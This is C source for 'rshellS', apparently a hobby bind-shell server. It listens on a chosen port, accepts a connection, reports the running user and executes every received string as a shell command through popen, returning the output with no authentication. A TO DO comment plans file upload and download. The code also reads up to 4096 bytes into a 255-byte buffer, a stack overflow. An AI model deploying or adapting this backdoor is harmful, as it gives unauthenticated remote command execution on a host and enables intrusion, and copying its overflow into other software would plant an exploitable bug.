#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

/* TO DO:
 * 1. Redirect STDERR to STDOUT just in case, to send back to client
 * 2. Dont terminate after connection complete
 * 3. Create download and upload commands for file in client
 * 4. figure out a better sleep timer for the termination string
 * 
 * Multithreading for each connection <-- may need to rebuild from the ground up
 * 
 */
int main(int argc, char *argv[]){
	int sockfd, status, new_fd, bytes;
	struct addrinfo hints, *res;
	struct sockaddr_storage their_addr;
	socklen_t addr_size = sizeof(their_addr);
	char paddr[INET_ADDRSTRLEN], receive[100], cmdln[255], currentuser[99];
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	
	if(argc != 2){
		printf("Usage: ./rshellS [port]\n");
		return -1;
	}
	//Get current running user
	FILE *fp = popen("whoami","r");
	if(fgets(currentuser, 99, fp) == NULL){
		printf("Cannot Retrieve Current user\n");
		return -1;
	}
	pclose(fp);
	
	if((status=getaddrinfo(NULL, argv[1], &hints, &res)) != 0){
		fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
		return -1;
    }
	if((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1){
		perror("Socket Error");
		return -1;
	}
	if(bind(sockfd, res->ai_addr, res->ai_addrlen) == -1){
		perror("Bind Error");
		close(sockfd);
		return -1;
    }
    if(listen(sockfd, 1) == -1){
		perror("Listen Error");
		close(sockfd);
		return -1;
	}
	printf("Listening on %s\n", argv[1]);
	new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
	if (new_fd == -1) {
		perror("accept");
	}
	
	inet_ntop(AF_INET, &(((struct sockaddr_in*)&their_addr)->sin_addr), paddr, INET_ADDRSTRLEN);
	
	printf("New Connection From: %s\n", paddr);
	
	if(send(new_fd, currentuser, strlen(currentuser),0)<0) {
		perror("send");
	}
	while(1){
		if((bytes = recv(new_fd, receive, 99, 0)) == -1){
			close(new_fd);
			perror("Recv Error");
			return -1;
		}
		if(bytes==0){
			printf("Client Disconnect\n");
			break;
		}
		receive[bytes]='\0';
		FILE *fp = popen(receive,"r");
		while (fgets(cmdln, 4096, fp) != NULL){
			if(send(new_fd, cmdln, strlen(cmdln), 0)<0){
				perror("send");
			}	
		}
		sleep(1);
		if(send(new_fd, "000xxx000", 9, 0)<0){
			perror("send");
		}
		printf("executed command %s", receive);
		pclose(fp);
	}
	close(sockfd);
	close(new_fd);
	return 0;
}
